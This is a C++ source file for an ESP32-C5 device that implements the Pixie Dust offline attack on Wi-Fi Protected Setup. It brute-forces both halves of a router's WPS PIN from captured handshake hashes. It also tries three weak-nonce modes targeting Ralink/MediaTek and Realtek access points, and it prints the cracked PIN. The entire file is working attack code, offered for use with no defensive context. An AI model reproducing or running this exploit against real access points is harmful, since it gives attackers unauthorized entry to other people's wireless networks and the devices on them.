// WpsPixieDust.cpp – PixieDust native C++ implementation
// Port of pixiewps algorithm using ESP32-C5 SDK HMAC-SHA256
#include "WpsPixieDust.h"

// ── External C SDK ────────────────────────────────────────────────────────────
extern "C" {
int hmac_sha256(const uint8_t *key, size_t key_len,
                const uint8_t *data, size_t data_len,
                uint8_t *mac);
int hmac_sha256_vector(const uint8_t *key, size_t key_len,
                       size_t num_elem,
                       const uint8_t * const *addr,
                       const size_t *len,
                       uint8_t *mac);
}

// ── Helpers ───────────────────────────────────────────────────────────────────

bool WpsPixieDust::hmac(const uint8_t *key, size_t key_len,
                        const uint8_t *data, size_t data_len,
                        uint8_t *out_32)
{
    return hmac_sha256(key, key_len, data, data_len, out_32) == 0;
}

bool WpsPixieDust::hmacVector4(const uint8_t *key, size_t key_len,
                                const uint8_t *a, size_t la,
                                const uint8_t *b, size_t lb,
                                const uint8_t *c, size_t lc,
                                const uint8_t *d, size_t ld,
                                uint8_t *out_32)
{
    const uint8_t *addr[4] = {a, b, c, d};
    size_t lens[4] = {la, lb, lc, ld};
    return hmac_sha256_vector(key, key_len, 4, addr, lens, out_32) == 0;
}

// WPS checksum: standard algorithm over 7-digit value
uint8_t WpsPixieDust::wpsChecksum(uint32_t pin7) {
    uint32_t accum = 0;
    uint32_t p = pin7;
    while (p) {
        accum += (3 * (p % 10));
        p /= 10;
        accum += (p % 10);
        p /= 10;
    }
    return (uint8_t)((10 - accum % 10) % 10);
}

void WpsPixieDust::uint32ToBe(uint32_t v, uint8_t *out) {
    out[0] = (v >> 24) & 0xFF;
    out[1] = (v >> 16) & 0xFF;
    out[2] = (v >>  8) & 0xFF;
    out[3] = (v      ) & 0xFF;
}

// ── Constructor ───────────────────────────────────────────────────────────────

WpsPixieDust::WpsPixieDust() {}

// ── Core cracking logic ───────────────────────────────────────────────────────

// Find first half 0000–9999 by brute-forcing PSK1
// PSK1 = HMAC-SHA256(AuthKey, "DDDD")[0:16]  (4-digit ASCII string)
// E-Hash1 = HMAC-SHA256(AuthKey, E-S1 || PSK1 || PKE || PKR)
int WpsPixieDust::findFirstHalf(
    const uint8_t *e_s1,
    const uint8_t *pke,
    const uint8_t *pkr,
    const uint8_t *auth_key,
    const uint8_t *e_hash1)
{
    uint8_t psk1[32];        // full HMAC output (use first 16 as PSK1)
    uint8_t test_hash[32];
    char    pin_half[5];     // "0000"...\0

    for (int i = 0; i <= 9999; i++) {
        snprintf(pin_half, sizeof(pin_half), "%04d", i);

        // PSK1 = HMAC-SHA256(AuthKey, pin_half_string) → 32 bytes; use first 16
        if (!hmac(auth_key, 32,
                  (const uint8_t*)pin_half, 4,
                  psk1))
            continue;
        // PSK1 is psk1[0..15]

        // E-Hash1 candidate = HMAC-SHA256(AuthKey, E-S1 || PSK1 || PKE || PKR)
        if (!hmacVector4(auth_key, 32,
                         e_s1,  16,
                         psk1,  16,  // first 16 bytes = PSK1
                         pke,  192,
                         pkr,  192,
                         test_hash))
            continue;

        if (memcmp(test_hash, e_hash1, 32) == 0) {
            Serial.printf("[Pixie] First half found: %04d\n", i);
            return i;
        }

        // Yield to watchdog every 500 iterations
        if ((i & 0x1FF) == 0) vTaskDelay(1);
    }
    return -1;
}

// Find second half 000–999 given first half
// PSK2 = HMAC-SHA256(AuthKey, "DDDD")[0:16]  where DDDD = D5D6D7+checksum
int WpsPixieDust::findSecondHalf(
    const uint8_t *e_s2,
    const uint8_t *pke,
    const uint8_t *pkr,
    const uint8_t *auth_key,
    const uint8_t *e_hash2,
    int first_half)
{
    uint8_t psk2[32];
    uint8_t test_hash[32];
    char    pin_half[5];

    for (int j = 0; j <= 999; j++) {
        // D8 = checksum over all 7 digits
        uint32_t pin7 = (uint32_t)first_half * 1000 + j;
        uint8_t  d8   = wpsChecksum(pin7);

        // second half string: 3 digits + checksum digit = 4 chars
        snprintf(pin_half, sizeof(pin_half), "%03d%d", j, d8);

        if (!hmac(auth_key, 32,
                  (const uint8_t*)pin_half, 4,
                  psk2))
            continue;

        if (!hmacVector4(auth_key, 32,
                         e_s2,  16,
                         psk2,  16,
                         pke,  192,
                         pkr,  192,
                         test_hash))
            continue;

        if (memcmp(test_hash, e_hash2, 32) == 0) {
            Serial.printf("[Pixie] Second half found: %03d (checksum=%d)\n", j, d8);
            return j;
        }

        if ((j & 0xFF) == 0) vTaskDelay(1);
    }
    return -1;
}

// Try crack with given E-S1 and E-S2 seeds
bool WpsPixieDust::tryCrack(
    const uint8_t *e_s1,
    const uint8_t *e_s2,
    const uint8_t *pke,
    const uint8_t *pkr,
    const uint8_t *auth_key,
    const uint8_t *e_hash1,
    const uint8_t *e_hash2,
    char *pin_out)
{
    int first = findFirstHalf(e_s1, pke, pkr, auth_key, e_hash1);
    if (first < 0) return false;

    int second = findSecondHalf(e_s2, pke, pkr, auth_key, e_hash2, first);
    if (second < 0) return false;

    uint32_t pin7 = (uint32_t)first * 1000 + (uint32_t)second;
    uint8_t  d8   = wpsChecksum(pin7);
    snprintf(pin_out, 9, "%04d%03d%d", first, second, d8);
    return true;
}

// ── Public API ────────────────────────────────────────────────────────────────

PixieDustResult WpsPixieDust::runMode(
    uint8_t mode,
    const uint8_t *pke,
    const uint8_t *pkr,
    const uint8_t *auth_key,
    const uint8_t *e_nonce,
    const uint8_t *e_hash1,
    const uint8_t *e_hash2,
    uint32_t base_ts)
{
    PixieDustResult res;
    memset(&res, 0, sizeof(res));
    res.mode = mode;
    char pin_out[9] = {0};

    if (mode == PIXIE_MODE_ZEROS) {
        // ── ZEROS mode: E-S1 = E-S2 = all 0x00 (Ralink/MediaTek) ──────────
        Serial.println("[Pixie] Mode ZEROS (Ralink)...");
        uint8_t e_s1[16] = {0};
        uint8_t e_s2[16] = {0};
        if (tryCrack(e_s1, e_s2, pke, pkr, auth_key, e_hash1, e_hash2, pin_out)) {
            res.found = true;
            memcpy(res.pin, pin_out, 9);
            return res;
        }

    } else if (mode == PIXIE_MODE_ENONCE) {
        // ── ENONCE mode: E-S1 = E-S2 = E-Nonce (some Realtek) ─────────────
        Serial.println("[Pixie] Mode ENONCE (E-Nonce based)...");
        if (tryCrack(e_nonce, e_nonce, pke, pkr, auth_key, e_hash1, e_hash2, pin_out)) {
            res.found = true;
            memcpy(res.pin, pin_out, 9);
            return res;
        }
        // Also try XOR variant
        uint8_t e_s_xor[16];
        for (int k = 0; k < 16; k++) e_s_xor[k] = e_nonce[k] ^ 0xFF;
        if (tryCrack(e_s_xor, e_s_xor, pke, pkr, auth_key, e_hash1, e_hash2, pin_out)) {
            res.found = true;
            memcpy(res.pin, pin_out, 9);
            return res;
        }

    } else if (mode == PIXIE_MODE_TIMESTAMP) {
        // ── TIMESTAMP mode: E-S1/E-S2 based on Unix timestamp ±10s ─────────
        Serial.printf("[Pixie] Mode TIMESTAMP (base_ts=%u)...\n", base_ts);
        if (base_ts == 0) {
            // Try using first 4 bytes of E-Nonce as big-endian timestamp
            base_ts  = ((uint32_t)e_nonce[0] << 24)
                      | ((uint32_t)e_nonce[1] << 16)
                      | ((uint32_t)e_nonce[2] <<  8)
                      |  (uint32_t)e_nonce[3];
        }

        for (int32_t delta = -10; delta <= 10; delta++) {
            uint32_t ts = (uint32_t)((int32_t)base_ts + delta);
            uint8_t seed[16] = {0};
            uint32ToBe(ts, seed);  // first 4 bytes = timestamp, rest zeros

            if (tryCrack(seed, seed, pke, pkr, auth_key, e_hash1, e_hash2, pin_out)) {
                res.found = true;
                res.ts_offset = delta;
                memcpy(res.pin, pin_out, 9);
                return res;
            }
        }
    }

    return res;  // not found
}

PixieDustResult WpsPixieDust::run(
    const uint8_t *pke,
    const uint8_t *pkr,
    const uint8_t *auth_key,
    const uint8_t *e_nonce,
    const uint8_t *e_hash1,
    const uint8_t *e_hash2,
    uint32_t base_ts)
{
    Serial.println("[Pixie] Starting PixieDust attack...");

    // Try ZEROS first (most common - Ralink/MediaTek)
    PixieDustResult r = runMode(PIXIE_MODE_ZEROS, pke, pkr, auth_key,
                                 e_nonce, e_hash1, e_hash2, base_ts);
    if (r.found) {
        Serial.printf("[Pixie] CRACKED (ZEROS)! PIN=%s\n", r.pin);
        return r;
    }

    // Try ENONCE
    r = runMode(PIXIE_MODE_ENONCE, pke, pkr, auth_key,
                e_nonce, e_hash1, e_hash2, base_ts);
    if (r.found) {
        Serial.printf("[Pixie] CRACKED (ENONCE)! PIN=%s\n", r.pin);
        return r;
    }

    // Try TIMESTAMP (only if base_ts or E-Nonce provides a plausible ts)
    r = runMode(PIXIE_MODE_TIMESTAMP, pke, pkr, auth_key,
                e_nonce, e_hash1, e_hash2, base_ts);
    if (r.found) {
        Serial.printf("[Pixie] CRACKED (TIMESTAMP+%d)! PIN=%s\n",
                      r.ts_offset, r.pin);
        return r;
    }

    Serial.println("[Pixie] PixieDust failed — AP not vulnerable.");
    return r;
}
